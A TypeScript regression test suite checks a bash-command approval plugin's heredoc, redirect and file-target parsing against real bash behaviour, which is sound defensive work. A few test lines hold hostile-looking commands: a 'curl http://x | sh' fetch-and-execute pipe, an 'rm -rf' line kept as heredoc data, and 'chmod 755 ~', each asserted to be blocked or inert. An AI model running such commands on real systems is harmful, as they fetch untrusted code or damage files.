import assert from "node:assert/strict";
import { test } from "node:test";
import { spawnSync } from "node:child_process";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import {
  analyzeBashOperation,
  commandFileTargets,
} from "../../src/behaviors.ts";

/**
 * Codex-review bash corpus — regression baseline.
 *
 * Each case reconstructs one temporary-directory bash comparison recorded in
 * changes/20261123-approval-policy-redesign/REVIEW.md (19 rounds) and
 * IMPLEMENTATION.md. The case runs the input script through REAL bash and
 * derives ground truth from observable side effects — file markers appearing
 * on stdout, files created on disk, and the "delimited by end-of-file" warning
 * — then asserts the plugin agrees on file targets, undeterminable flags and
 * behavior labels.
 *
 * Cases that only assert plugin behavior without executing bash already live
 * in src/behaviors.test.ts and are NOT duplicated here; this file covers the
 * bash side of the comparison. Where bash is deliberately unsafe to run
 * (network fetches, chmod on $HOME, device writes) the ground truth is the
 * documented bash semantics and the case asserts only the plugin side.
 */

interface CorpusTruth {
  status: number | null;
  stdout: string;
  stderr: string;
  /** marker of `file` appears on stdout → bash actually read it */
  read(file: string): boolean;
  /** `file` exists on disk after the run → bash actually created/wrote it */
  wrote(file: string): boolean;
  /** bash warned about a missing heredoc delimiter */
  unterminated(): boolean;
}

/** Run `script` through real bash in a fresh temp dir, capturing ground truth. */
function runBash(script: string, files: Record<string, string> = {}): CorpusTruth {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "sa-corpus-"));
  try {
    for (const [name, content] of Object.entries(files)) {
      const p = path.join(dir, name);
      fs.mkdirSync(path.dirname(p), { recursive: true });
      fs.writeFileSync(p, content);
    }
    const r = spawnSync("bash", ["--norc"], {
      input: script,
      cwd: dir,
      encoding: "utf8",
    });
    const stdout = r.stdout ?? "";
    const stderr = r.stderr ?? "";
    const written = new Set<string>();
    const walk = (d: string) => {
      for (const entry of fs.readdirSync(d, { withFileTypes: true })) {
        const full = path.join(d, entry.name);
        if (entry.isDirectory()) walk(full);
        else written.add(path.relative(dir, full));
      }
    };
    walk(dir);
    return {
      status: r.status,
      stdout,
      stderr,
      read: (file) => stdout.includes(`MARK_${file}`),
      wrote: (file) => written.has(file),
      unterminated: () => /delimited by end-of-file/.test(stderr),
    };
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
}

/** Absolute paths of every file target the plugin reports. */
function resolvedTargets(script: string, cwd: string): string[] {
  return commandFileTargets(script, cwd).targets.map((t) =>
    path.resolve(t.cwd, t.value),
  );
}

const BASH_VERSION = spawnSync("bash", ["--version"], { encoding: "utf8" }).stdout;

// ── R15-U1 · quoted heredoc bodies never leak lexical state ─────────────────
// REVIEW 第十五轮 U1 / 第十六轮 已通过验收.

test("corpus R15-U1a: apostrophe in quoted body leaves later filename literal", () => {
  // Filename literally contains a backslash and a newline: bash reads it
  // verbatim; a candidate that strips the pair checks the wrong file.
  const oddName = "a\\\nb";
  const script = `cat <<'EOF'\n'ts\nEOF\ncat '${oddName}'\n`;
  const truth = runBash(script, { [oddName]: "MARK_literal\n" });
  assert.ok(truth.read("literal"), `bash reads the literal name; stdout=${truth.stdout}`);
  const r = commandFileTargets(script, "/tmp");
  assert.ok(r.targets.some((t) => t.value === oddName), "plugin keeps \\ and newline in the operand");
  assert.equal(r.undeterminable, false);
});

test("corpus R15-U1b: trailing backslash in quoted body still closes the heredoc", () => {
  const script = "cat <<'EOF'\nline\\\nEOF\ncat note\n";
  const truth = runBash(script, { note: "MARK_note\n" });
  assert.ok(truth.read("note"), "bash closes at EOF and reads note");
  assert.equal(truth.unterminated(), false);
  const targets = resolvedTargets(script, "/tmp");
  assert.ok(targets.includes("/tmp/note"), `note registered: ${targets}`);
  assert.equal(commandFileTargets(script, "/tmp").undeterminable, false);
  const analysis = analyzeBashOperation(script, "/tmp", "/tmp");
  assert.equal(analysis.requiresConfirmation ?? false, false, "closed body needs no confirmation");
});

test("corpus R15-U1c: inch mark in body and comment-backslash do not swallow the next read", () => {
  const script = 'cat <<\'EOF\'\n12"\nEOF\n# tail \\\ncat note\n';
  const truth = runBash(script, { note: "MARK_note\n" });
  assert.ok(truth.read("note"), "bash ends the comment at the newline and reads note");
  assert.ok(resolvedTargets(script, "/tmp").includes("/tmp/note"));
  assert.equal(commandFileTargets(script, "/tmp").undeterminable, false);
});

// ── R16-K1 · continued declaration lines join operands before the body ──────

test("corpus R16-K1a: continued declaration operand is a cat argument, not body", () => {
  const single = "cat <<EOF note\nbody\nEOF\n";
  const cont = "cat <<EOF \\\nnote\nbody\nEOF\n";
  const truth = runBash(cont, { note: "MARK_note\n" });
  assert.ok(truth.read("note"), "bash reads the continued operand");
  assert.equal(truth.unterminated(), false);
  for (const script of [single, cont]) {
    const targets = resolvedTargets(script, "/tmp");
    assert.ok(targets.includes("/tmp/note"), `note in ${targets}`);
    assert.equal(commandFileTargets(script, "/tmp").undeterminable, false);
  }
});

test("corpus R16-K1b: continued operand binds to the cd'ed directory", () => {
  const script = "cd sub\ncat <<EOF \\\nnote\nbody\nEOF\n";
  const truth = runBash(script, { "sub/note": "MARK_subnote\n" });
  assert.ok(truth.read("subnote"), "bash reads sub/note");
  const r = commandFileTargets(script, "/tmp");
  assert.ok(r.targets.some((t) => t.value === "note" && t.cwd === path.resolve("/tmp", "sub")),
    `sub/note: ${JSON.stringify(r.targets)}`);
  assert.equal(r.undeterminable, false);
});

// ── R16-K2 / R17-M1 · logical body lines compared against the delimiter ─────

test("corpus R16-K2: unquoted body joins continuations before the delimiter check", () => {
  // abc\ + EOF joins to abcEOF ≠ EOF, so `cat note` is body text. A second
  // heredoc later closes and bash prints the whole first body as data.
  const script = "cat <<EOF\nabc\\\nEOF\ncat note\ncat <<EOF\ny\nEOF\n";
  const truth = runBash(script, { note: "MARK_note\n" });
  assert.ok(truth.stdout.includes("abcEOF"), `joined line is body: ${truth.stdout}`);
  assert.ok(truth.stdout.includes("cat note"), "the would-be command stays data");
  assert.equal(truth.read("note"), false, "bash never executes the inner cat");
  const r = commandFileTargets(script, "/tmp");
  assert.deepEqual(r.targets, [], "note is body data, not a file target");
  assert.equal(r.undeterminable, false, "body is closed by the real delimiter");
});

test("corpus R17-M1a: backslash-line + delimiter closes the heredoc exactly", () => {
  // `\` + EOF joins to exactly EOF → body closes; `cat note` runs.
  const script = "cat <<EOF\n\\\nEOF\ncat note\ncat <<EOF\ny\nEOF\n";
  const truth = runBash(script, { note: "MARK_note\n" });
  assert.ok(truth.read("note"), "bash closes the first body and reads note");
  assert.equal(truth.unterminated(), false);
  const targets = resolvedTargets(script, "/tmp");
  assert.ok(targets.includes("/tmp/note"), `note in ${targets}`);
  assert.equal(commandFileTargets(script, "/tmp").undeterminable, false);
});

test("corpus R17-M1b: even backslashes do not join; the next delimiter closes", () => {
  const script = "cat <<EOF\nabc\\\\\nEOF\ncat note\n";
  const truth = runBash(script, { note: "MARK_note\n" });
  assert.ok(truth.read("note"), "bash reads note after the closed body");
  assert.equal(truth.unterminated(), false);
  const targets = resolvedTargets(script, "/tmp");
  assert.ok(targets.includes("/tmp/note"));
  assert.equal(commandFileTargets(script, "/tmp").undeterminable, false);
});

test("corpus R17-M1c: quoted bodies never join — delimiter closes at once", () => {
  const script = "cat <<'EOF'\n\\\nEOF\ncat note\n";
  const truth = runBash(script, { note: "MARK_note\n" });
  assert.ok(truth.read("note"), "quoted body closes at the first EOF");
  assert.equal(truth.unterminated(), false);
  const targets = resolvedTargets(script, "/tmp");
  assert.ok(targets.includes("/tmp/note"));
  assert.equal(commandFileTargets(script, "/tmp").undeterminable, false);
});

// ── R18-P1 · continuation-open body line at EOF still feeds analysis ────────

test("corpus R18-P1a: unterminated trailing continuation still executes the substitution", () => {
  for (const tail of ["\\", "\\\n"]) {
    const script = `cat <<EOF\n$(cat note)${tail}`;
    const truth = runBash(script, { note: "MARK_note\n" });
    assert.ok(truth.read("note"), `bash reads note even unterminated (${JSON.stringify(tail)})`);
    assert.equal(truth.unterminated(), true, "bash warns about the missing delimiter");
    const r = commandFileTargets(script, "/tmp");
    assert.ok(resolvedTargets(script, "/tmp").includes("/tmp/note"), "note registered");
    assert.equal(r.undeterminable, true, "unterminated → undeterminable");
  }
});

test("corpus R18-P1b: local inline computation keeps its behavior label and confirmation", () => {
  const script = "cat <<EOF\n$(bash -c 'echo $((6*7))')\\\n";
  const truth = runBash(script);
  assert.ok(truth.stdout.includes("42"), `bash computes 42: ${truth.stdout}`);
  assert.equal(truth.unterminated(), true);
  const analysis = analyzeBashOperation(script, "/tmp", "/tmp");
  assert.ok(analysis.behaviors.includes("interpreter-inline-execution"),
    `inline execution label: ${analysis.behaviors}`);
  assert.equal(analysis.requiresConfirmation, true);
});

test("corpus R18-P1c: continuation-open body in a subdirectory reads sub/note", () => {
  const script = "cd sub\ncat <<EOF\n$(cat note)\\\n";
  const truth = runBash(script, { "sub/note": "MARK_subnote\n" });
  assert.ok(truth.read("subnote"), "bash reads sub/note");
  const r = commandFileTargets(script, "/tmp");
  assert.ok(r.targets.some((t) => t.value === "note" && t.cwd === path.resolve("/tmp", "sub")));
  assert.equal(r.undeterminable, true);
});

test("corpus R19: first and last body lines both feed substitution analysis", () => {
  const script = "cat <<EOF\n$(cat extra)\n$(cat note)\\\n";
  const truth = runBash(script, { extra: "MARK_extra\n", note: "MARK_note\n" });
  assert.ok(truth.read("extra") && truth.read("note"), "bash reads both files");
  assert.equal(truth.unterminated(), true);
  const targets = resolvedTargets(script, "/tmp");
  assert.ok(targets.includes("/tmp/extra") && targets.includes("/tmp/note"), `${targets}`);
  assert.equal(commandFileTargets(script, "/tmp").undeterminable, true);
});

test("corpus R19: queued quoted and unquoted bodies only expand where bash expands", () => {
  const script = "cat <<EOF; cat <<'Q'\n$(cat note)\nEOF\n$(cat nope)\nQ\n";
  const truth = runBash(script, { note: "MARK_note\n", nope: "MARK_nope\n" });
  assert.ok(truth.read("note"), "unquoted body expands");
  assert.equal(truth.read("nope"), false, "quoted body stays literal");
  const targets = resolvedTargets(script, "/tmp");
  assert.ok(targets.includes("/tmp/note"));
  assert.ok(!targets.includes("/tmp/nope"), "quoted substitution must not become a target");
});

// ── R10-Q1/Q3 · heredoc expansion rules and delimiter quoting ───────────────

test("corpus R10-Q1: apostrophe in unquoted body does not swallow substitutions", () => {
  const script = "cat <<EOF\nit's $(cat note)\nEOF\n";
  const truth = runBash(script, { note: "MARK_note\n" });
  assert.ok(truth.read("note"), "bash expands the substitution after an apostrophe");
  assert.ok(resolvedTargets(script, "/tmp").includes("/tmp/note"));
});

test("corpus R11-Q1a: cd inside a substitution stays in its subshell", () => {
  const script = "cat <<EOF\n$(cd sub; cat note)\nEOF\ncat later\n";
  const truth = runBash(script, { "sub/note": "MARK_subnote\n", later: "MARK_later\n" });
  assert.ok(truth.read("subnote") && truth.read("later"), "subshell cd does not leak to the parent");
  const targets = resolvedTargets(script, "/tmp");
  assert.ok(targets.includes(path.resolve("/tmp", "sub", "note")), `${targets}`);
  assert.ok(targets.includes("/tmp/later"), "parent later stays at the declaration cwd");
});

test("corpus R11-Q1b: declaration-line cd does not reach back into the body", () => {
  const script = "cat <<EOF; cd sub; cat later\n$(cat note)\nEOF\n";
  const truth = runBash(script, { note: "MARK_note\n", "sub/later": "MARK_sublater\n" });
  assert.ok(truth.read("note") && truth.read("sublater"), "body reads at declaration cwd, later at sub");
  const targets = resolvedTargets(script, "/tmp");
  assert.ok(targets.includes("/tmp/note"), `${targets}`);
  assert.ok(targets.includes(path.resolve("/tmp", "sub", "later")), `${targets}`);
});

test("corpus R12-R1: cd && heredoc on one line expands at the cd'ed directory", () => {
  const script = "cd sub && cat <<EOF\n$(cat note)\nEOF\n";
  const truth = runBash(script, { "sub/note": "MARK_subnote\n" });
  assert.ok(truth.read("subnote"));
  assert.ok(resolvedTargets(script, "/tmp").includes(path.resolve("/tmp", "sub", "note")));
});

test("corpus R10-Q3: backslash-quoted delimiter keeps the body literal", () => {
  const script = "cat <<\\EOF\n$(cat note)\nEOF\ncat two\n";
  const truth = runBash(script, { note: "MARK_note\n", two: "MARK_two\n" });
  assert.equal(truth.read("note"), false, "quoted delimiter → no expansion");
  assert.ok(truth.read("two"), "command after the body still runs");
  const targets = resolvedTargets(script, "/tmp");
  assert.ok(!targets.includes("/tmp/note"));
  assert.ok(targets.includes("/tmp/two"));
  assert.equal(commandFileTargets(script, "/tmp").undeterminable, false);
});

test("corpus R10-Q3: mixed-fragment delimiter keeps the body literal", () => {
  const script = "cat <<'E'OF\n$(cat note)\nEOF\ncat two\n";
  const truth = runBash(script, { note: "MARK_note\n", two: "MARK_two\n" });
  assert.equal(truth.read("note"), false);
  assert.ok(truth.read("two"));
  const targets = resolvedTargets(script, "/tmp");
  assert.ok(!targets.includes("/tmp/note"));
  assert.ok(targets.includes("/tmp/two"));
});

test("corpus R9-Z1a: quoted delimiter with literal backslash matches its own word", () => {
  const script = "cat <<'E\\OF'\n$(cat note)\nE\\OF\ncat two\n";
  const truth = runBash(script, { note: "MARK_note\n", two: "MARK_two\n" });
  assert.equal(truth.read("note"), false, "quoted delimiter body is literal");
  assert.ok(truth.read("two"), "delimiter matched by its evaluated word value");
  const targets = resolvedTargets(script, "/tmp");
  assert.ok(!targets.includes("/tmp/note"));
  assert.ok(targets.includes("/tmp/two"));
  assert.equal(commandFileTargets(script, "/tmp").undeterminable, false);
});

// ── R11-N1 / R12-N1 · empty quoted delimiter and blank-line termination ─────

test("corpus R11-N1: empty quoted delimiter ends at a real blank line", () => {
  const script = "cat <<''\n$(cat note)\n\ncat two\n";
  const truth = runBash(script, { note: "MARK_note\n", two: "MARK_two\n" });
  assert.equal(truth.read("note"), false, "literal body, no expansion");
  assert.ok(truth.read("two"));
  assert.equal(truth.unterminated(), false);
  const r = commandFileTargets(script, "/tmp");
  assert.ok(resolvedTargets(script, "/tmp").includes("/tmp/two"));
  assert.equal(r.undeterminable, false);
});

test("corpus R12-N1: trailing newline is not a blank line — heredoc stays unterminated", () => {
  const open = "cat <<''\nbody\n";
  const truth = runBash(open);
  assert.equal(truth.unterminated(), true, "bash warns about the missing delimiter");
  assert.equal(commandFileTargets(open, "/tmp").undeterminable, true);
  const closed = "cat <<''\nbody\n\ncat two\n";
  assert.equal(runBash(closed, { two: "MARK_two\n" }).read("two"), true);
  assert.equal(commandFileTargets(closed, "/tmp").undeterminable, false);
});

// ── R13-S1/S2 · parenthesized groups and multi-line semantics ───────────────

test("corpus R13-S1: expansions inside a parenthesized group bind to the group's cwd", () => {
  const inSub = "( cd sub; cat <<EOF\n$(cat note)\nEOF\n)\n";
  const truth = runBash(inSub, { "sub/note": "MARK_subnote\n" });
  assert.ok(truth.read("subnote"), "bash expands inside the subshell at sub");
  assert.ok(resolvedTargets(inSub, "/tmp").includes(path.resolve("/tmp", "sub", "note")));
  const atRoot = "( cat <<EOF\n$(cat note)\nEOF\n)\n";
  assert.ok(runBash(atRoot, { note: "MARK_note\n" }).read("note"));
  assert.ok(resolvedTargets(atRoot, "/tmp").includes("/tmp/note"));
});

test("corpus R13-S2: quoted newlines stay inside one filename", () => {
  const name = "multi\nline";
  const script = `cat "${name}"\n`;
  const truth = runBash(script, { [name]: "MARK_multiline\n" });
  assert.ok(truth.read("multiline"), "bash reads the single multi-line filename");
  const r = commandFileTargets(script, "/tmp");
  assert.ok(r.targets.some((t) => t.value === name), `one operand: ${JSON.stringify(r.targets)}`);
});

test("corpus R14-T2a: a comment's trailing backslash does not swallow the next command", () => {
  const script = "# c \\\ncat note\n";
  const truth = runBash(script, { note: "MARK_note\n" });
  assert.ok(truth.read("note"), "bash ends the comment at the newline and runs cat");
  assert.ok(resolvedTargets(script, "/tmp").includes("/tmp/note"));
});

test("corpus R14-T2b: paired trailing backslashes leave a literal name; next line still runs", () => {
  const script = "cat note\\\\\ncat two\n";
  const truth = runBash(script, { "note\\": "MARK_notepair\n", two: "MARK_two\n" });
  assert.ok(truth.read("notepair"), "bash reads the file literally named note\\");
  assert.ok(truth.read("two"), "the next line is a separate command");
  const r = commandFileTargets(script, "/tmp");
  assert.ok(r.targets.some((t) => t.value === "note\\"), `literal note\\: ${JSON.stringify(r.targets)}`);
  assert.ok(r.targets.some((t) => t.value === "two"));
});

test("corpus R14-T2c: apostrophe inside double quotes folds a continuation into one operand", () => {
  const script = 'cat "it\'s \\\nnote"\n';
  const truth = runBash(script, { "it's note": "MARK_itsnote\n" });
  assert.ok(truth.read("itsnote"), `bash folds the continuation: ${truth.stderr}`);
  const r = commandFileTargets(script, "/tmp");
  assert.ok(r.targets.some((t) => t.value === "it's note"), `${JSON.stringify(r.targets)}`);
});

test("corpus R15-U2 / R14-T1: continuation before the opening paren binds the same segment", () => {
  const single = "( cat <<EOF\n$(cat note)\nEOF\n)\n";
  const cont = "\\\n( cat <<EOF\n$(cat note)\nEOF\n)\n";
  for (const script of [single, cont]) {
    assert.ok(runBash(script, { note: "MARK_note\n" }).read("note"));
    assert.ok(resolvedTargets(script, "/tmp").includes("/tmp/note"));
    assert.equal(commandFileTargets(script, "/tmp").undeterminable, false);
  }
});

// ── R7-Y2 / R8-Z1 · here-strings and heredoc markers at syntax positions ────

test("corpus R7-Y2: here-string queues no body; later commands still analyzed", () => {
  const script = "cat <<<'meeting minutes'\ncat note\n";
  const truth = runBash(script, { note: "MARK_note\n" });
  assert.ok(truth.read("note"), "bash runs the command after the here-string");
  const targets = resolvedTargets(script, "/tmp");
  assert.deepEqual(targets, ["/tmp/note"], "here-string text is not a file target");
});

test("corpus R7-Y2b: spaced and quoted delimiters keep body text out of targets", () => {
  const script = "cat << 'EOF'\nmeeting minutes\nEOF\ncat note\n";
  const truth = runBash(script, { note: "MARK_note\n" });
  assert.ok(truth.read("note"));
  const targets = resolvedTargets(script, "/tmp");
  assert.deepEqual(targets, ["/tmp/note"]);
});

test("corpus R8-Z1: heredoc markers inside quotes and comments start no body", () => {
  const quoted = 'echo "see <<EOF"\ncat note\n';
  const commented = "# cat <<EOF\ncat note\n";
  for (const script of [quoted, commented]) {
    assert.ok(runBash(script, { note: "MARK_note\n" }).read("note"));
    assert.deepEqual(resolvedTargets(script, "/tmp"), ["/tmp/note"]);
  }
});

test("corpus R6-X4: literal heredoc body is data, never a command", () => {
  const script = "cat <<'EOF'\ncat report.tsv\nrm -rf /tmp/x\nEOF\ncat note\n";
  const truth = runBash(script, { note: "MARK_note\n" });
  assert.ok(truth.read("note"), "the real command after the body runs");
  const targets = resolvedTargets(script, "/tmp");
  assert.deepEqual(targets, ["/tmp/note"], "body text creates no file targets");
  const analysis = analyzeBashOperation(script, "/tmp", "/tmp");
  assert.ok(!analysis.behaviors.includes("recursive-force-delete"), "body rm is not executed");
});

// ── R7-Y1 / R9-Z1c · redirect operands judged by evaluated word value ───────

test("corpus R7-Y1: quoted redirect spellings name the same file", () => {
  const forms = ['printf x >2026.log\n', 'printf x >"2026".log\n', 'printf x >"2026.log"\n'];
  for (const script of forms) {
    const truth = runBash(script);
    assert.ok(truth.wrote("2026.log"), `bash writes 2026.log: ${script}`);
    const r = commandFileTargets(script, "/tmp");
    assert.ok(resolvedTargets(script, "/tmp").includes("/tmp/2026.log"), `${script}`);
    assert.equal(r.undeterminable, false);
  }
});

test("corpus R7-Y1b: quoted fd duplication creates no file", () => {
  const script = 'printf x >&"2"\nprintf y 2>&1\n';
  const truth = runBash(script);
  assert.equal(truth.status, 0, "both are valid fd duplications");
  assert.deepEqual(commandFileTargets(script, "/tmp").targets, [], "fd copies have no file target");
});

test("corpus R7-Y1c: explicit stderr fd with a filename is an ambiguous redirect", () => {
  const script = "printf x 2>&2026.log\n";
  const truth = runBash(script);
  assert.ok(/ambiguous redirect/.test(truth.stderr), `bash rejects it: ${truth.stderr}`);
  assert.equal(truth.wrote("2026.log"), false);
  const r = commandFileTargets(script, "/tmp");
  assert.equal(r.undeterminable, true);
});

test("corpus R9-Z1c: input duplication of a filename is invalid", () => {
  const script = "cat <&note\n";
  const truth = runBash(script, { note: "MARK_note\n" });
  assert.ok(/ambiguous redirect/.test(truth.stderr));
  assert.equal(truth.read("note"), false, "bash never reads the file");
  const r = commandFileTargets(script, "/tmp");
  assert.equal(r.undeterminable, true);
});

// REVIEW 第九轮 Z1c records bash 5.2.37 accepting `01>&file.txt` as a legal
// combined write. Bash 5.3 rejects `n>&word` with a non-numeric word as an
// ambiguous redirect, so this comparison only applies to bash < 5.3.
const BASH_MAJOR = Number(BASH_VERSION.match(/version (\d+)/)?.[1] ?? 0);
const BASH_MINOR = Number(BASH_VERSION.match(/version \d+\.(\d+)/)?.[1] ?? 0);
const FD01_SUPPORTED = BASH_MAJOR < 5 || (BASH_MAJOR === 5 && BASH_MINOR < 3);

// bun's node:test typings omit test.skip; the runtime provides it.
const skipTest = (test as unknown as { skip: typeof test }).skip;
const fd01Test = FD01_SUPPORTED ? test : skipTest;

fd01Test("corpus R9-Z1c-fd01: leading-zero stdout fd writes the file", () => {
  const script = "printf x 01>&file.txt\n";
  const truth = runBash(script);
  assert.ok(truth.wrote("file.txt"), `bash creates file.txt: ${truth.stderr}`);
  assert.equal(commandFileTargets(script, "/tmp").undeterminable, false);
  assert.ok(resolvedTargets(script, "/tmp").includes("/tmp/file.txt"));
});

// ── R6-X3 / R5-V1 · redirection operand spellings and option clusters ───────

test("corpus R6-X3: input redirection keeps a leading dash in the filename", () => {
  for (const script of ["cat < -notes.tsv\n", "cat <-notes.tsv\n"]) {
    const truth = runBash(script, { "-notes.tsv": "MARK_dash\n", "notes.tsv": "MARK_plain\n" });
    assert.ok(truth.read("dash"), `bash reads -notes.tsv: ${script}`);
    assert.equal(truth.read("plain"), false);
    const r = commandFileTargets(script, "/tmp");
    assert.ok(r.targets.some((t) => t.value === "-notes.tsv"), `${JSON.stringify(r.targets)}`);
  }
});

test("corpus R6-X1: equals sign inside a short-option cluster is a filename character", () => {
  const script = "sort -oreport=1.tsv in.tsv\n";
  const truth = runBash(script, { "in.tsv": "MARK_in\n" });
  assert.ok(truth.wrote("report=1.tsv"), `bash writes report=1.tsv: ${truth.stderr}`);
  const targets = resolvedTargets(script, "/tmp");
  assert.ok(targets.includes("/tmp/report=1.tsv"), `${targets}`);
  assert.ok(targets.includes("/tmp/in.tsv"));
});

test("corpus R5-V1: merged short options produce the same targets as split options", () => {
  const merged = "sort -roout.tsv in.tsv\n";
  const split = "sort -r -o out.tsv in.tsv\n";
  for (const script of [merged, split]) {
    const truth = runBash(script, { "in.tsv": "MARK_in\n" });
    assert.ok(truth.wrote("out.tsv"), `bash writes out.tsv: ${script}`);
    const targets = resolvedTargets(script, "/tmp");
    assert.ok(targets.includes("/tmp/out.tsv") && targets.includes("/tmp/in.tsv"), `${targets}`);
  }
});

test("corpus R5-V1b: an unknown cluster letter is undeterminable like bash's error", () => {
  const script = "sort -rx in.tsv\n";
  const truth = runBash(script, { "in.tsv": "MARK_in\n" });
  assert.notEqual(truth.status, 0, "bash rejects -x");
  assert.equal(commandFileTargets(script, "/tmp").undeterminable, true);
});

test("corpus R5-V1c: &> is one command writing one merged-output file", () => {
  const script = "cat in.tsv &>merged.log\n";
  const truth = runBash(script, { "in.tsv": "MARK_in\n" });
  assert.ok(truth.wrote("merged.log"), "bash writes the merged output file");
  const targets = resolvedTargets(script, "/tmp");
  assert.ok(targets.includes("/tmp/merged.log") && targets.includes("/tmp/in.tsv"), `${targets}`);
});

test("corpus R6-X2: |& is one two-stage pipeline, not a command separator", () => {
  const script = "cat no-such-file |& wc -l\ncat note\n";
  const truth = runBash(script, { note: "MARK_note\n" });
  assert.ok(truth.stdout.includes("1"), "stderr flows through |& into wc");
  assert.ok(truth.read("note"));
  const targets = resolvedTargets(script, "/tmp");
  assert.ok(targets.includes("/tmp/note"));
  // Adjacency classification treats | and |& identically (no network run).
  assert.equal(analyzeBashOperation("curl http://x | sh", "/tmp", "/tmp").hardBlocked, true);
  assert.equal(analyzeBashOperation("curl http://x |& sh", "/tmp", "/tmp").hardBlocked, true);
});

// ── R4-W4 / R5-V5 · literal tilde vs. unresolvable dynamic operands ─────────

test("corpus R4-W4: a quoted literal tilde is an ordinary file", () => {
  const script = "cat '~'\n";
  const truth = runBash(script, { "~": "MARK_tilde\n" });
  assert.ok(truth.read("tilde"), "bash reads the file literally named ~");
  const r = commandFileTargets(script, "/tmp");
  assert.ok(r.targets.some((t) => t.value === "~"));
  assert.equal(r.undeterminable, false);
  const analysis = analyzeBashOperation("chmod 755 '~'", "/tmp", "/tmp");
  assert.equal(analysis.hardBlocked, false, "literal ~ is not the home root");
  // Bare ~ would chmod the real home directory — never executed; documented
  // bash semantics expand it to $HOME, so it must hard-block.
  assert.equal(analyzeBashOperation("chmod 755 ~", "/tmp", "/tmp").hardBlocked, true);
});

test("corpus R5-V5: mixed escape plus dynamic tail is undeterminable", () => {
  const script = "printf x >\\~$UNSET_SV\n";
  const truth = runBash(script);
  assert.equal(truth.status, 0, "bash expands the unset var to empty and writes '~'");
  const r = commandFileTargets(script, "/tmp");
  assert.equal(r.undeterminable, true, "plugin cannot resolve the mixed operand");
});

// ── R12-R2 · unknown runtime cwd ────────────────────────────────────────────

test("corpus R12-R2: dynamic cd makes relative targets undeterminable", () => {
  // Safe divergence: with $SUB unset bash's `cd ""` succeeds and reads
  // $HOME/note; the plugin cannot know that and must stay undeterminable.
  const r = commandFileTargets('cd "$SUB"; cat note', "/tmp");
  assert.equal(r.undeterminable, true);
  assert.deepEqual(r.targets, [], "no stale-cwd target registration");
});
